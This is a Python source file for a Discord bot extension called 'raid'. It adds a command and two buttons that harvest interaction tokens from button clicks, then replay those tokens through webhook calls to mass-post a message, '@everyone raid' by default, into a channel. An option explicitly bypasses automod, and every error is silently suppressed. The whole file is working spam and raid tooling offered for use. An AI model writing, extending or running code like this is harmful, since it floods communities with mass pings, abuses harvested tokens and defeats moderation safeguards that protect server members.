import uuid
import discord
from discord import ButtonStyle
from discord.enums import (
    SeparatorSpacingSize,
    InteractionContextType,
    IntegrationType
)
from discord.commands import (
    slash_command as v4,
    Option,
    ApplicationContext
)
from discord.ui import (
    DesignerView,
    TextDisplay,
    Container,
    Separator,
    ActionRow,
    Button
)
from discord.ext.commands import Cog
from utils.cache import diskstore
from msgspec import Struct as struct
from contextlib import suppress
from asyncio import sleep

class raidstate(
    struct,
    kw_only=True
):
    message: str = "@everyone raid"
    cooldown: float = 0.1
    silent: bool = False
    bypass: bool = False
    sent: int = 0

class raidtoken(
    struct,
    kw_only=True
):
    id: str
    token: str

class raid(Cog):
    def __init__(self, bot):
        self.bot = bot
        self.states = diskstore(
            filepath="raid_states.bin",
            limit=1000,
            mode="lru"
        )
        self.farm_id = "v4:raid:farm"
        self.send_id = "v4:raid:send"

    def _get_store(self, cid: int) -> diskstore:
        return diskstore(
            filepath=f"tokens_{cid}.bin",
            limit=1000,
            mode="lru"
        )

    @Cog.listener()
    async def on_ready(self):
        self.bot.add_view(self._get_view(0, 0))

    def _get_view(self, tokens: int, sent: int) -> DesignerView:
        components = [
            Container(
                TextDisplay(content=f"interaction tokens: {tokens}\nmessages sent: {sent}\n"),
                Separator(
                    divider=True,
                    spacing=SeparatorSpacingSize.small,
                ),
                ActionRow(
                    Button(
                        style=ButtonStyle.primary,
                        label="farm",
                        custom_id=self.farm_id,
                    ),
                    Button(
                        style=ButtonStyle.danger,
                        label="send the messages",
                        custom_id=self.send_id,
                    ),
                ),
            ),
        ]
        return DesignerView(*components, timeout=None)

    @v4(
        name="interacton-raid",
        description="raid for interaction tokens",
        contexts={
            InteractionContextType.guild,
            InteractionContextType.bot_dm,
            InteractionContextType.private_channel
        },
        integration_types={
            IntegrationType.guild_install,
            IntegrationType.user_install
        }
    )
    async def raid_cmd(
        self,
        ctx: ApplicationContext,
        message: Option(
            str,
            name="message",
            description="the message to send",
            required=True
        ),
        cooldown: Option(
            float,
            name="cooldown",
            description="seconds to wait between each token dispatch",
            default=0.1
        ),
        silent: Option(
            bool,
            name="silent",
            description="send as silent msg?",
            default=False
        ),
        bypass_automod: Option(
            bool,
            name="bypass_automod",
            description="bypass automod?",
            default=False
        )
    ):
        state = raidstate(
            message=message,
            cooldown=cooldown,
            silent=silent,
            bypass=bypass_automod
        )
        await self.states.set(str(ctx.channel_id), state, 3600.0)
        
        store = self._get_store(ctx.channel_id)
        tokens = await store.get_all(raidtoken)
        await ctx.respond(
            view=self._get_view(len(tokens), 0),
            ephemeral=True
        )

    @Cog.listener()
    async def on_interaction(self, interaction: discord.Interaction):
        if interaction.type != discord.InteractionType.component:
            return
            
        cid = interaction.custom_id
        if cid == self.farm_id:
            await self._handle_farm(interaction)
        elif cid == self.send_id:
            await self._handle_send(interaction)

    async def _handle_farm(self, itx: discord.Interaction):
        store = self._get_store(itx.channel_id)
        t = raidtoken(
            id=str(itx.application_id),
            token=itx.token
        )
        await store.set(itx.token, t, 900.0)
        
        state = await self.states.get(str(itx.channel_id), raidstate) or raidstate()
        state.sent += 5
        await self.states.set(str(itx.channel_id), state, 3600.0)
        
        tokens = await store.get_all(raidtoken)
        with suppress(Exception):
            await itx.response.edit_message(view=self._get_view(len(tokens), state.sent))

    async def _handle_send(self, itx: discord.Interaction):
        with suppress(Exception):
            await itx.response.defer(ephemeral=True)

        store = self._get_store(itx.channel_id)
        tokens = await store.get_all(raidtoken)
        state = await self.states.get(str(itx.channel_id), raidstate) or raidstate()
        
        view_payload = None
        if state.bypass:
            view_payload = [Container(TextDisplay(content=state.message)).to_dict()]

        sent = 0
        if tokens:
            while sent < state.sent:
                for t in tokens:
                    if sent >= state.sent:
                        break
                    with suppress(Exception):
                        await self.bot.v4_webhook.send(
                            content=state.message,
                            silent=state.silent,
                            view=view_payload,
                            is_v2=state.bypass,
                            application_id=t.id,
                            token=t.token
                        )
                    sent += 1
                    await sleep(state.cooldown)
        
        await store.clear()
        state.sent = 0
        await self.states.set(str(itx.channel_id), state, 3600.0)
        
        with suppress(Exception):
            await itx.edit_original_response(view=self._get_view(0, 0))

def setup(bot):
    bot.add_cog(raid(bot))
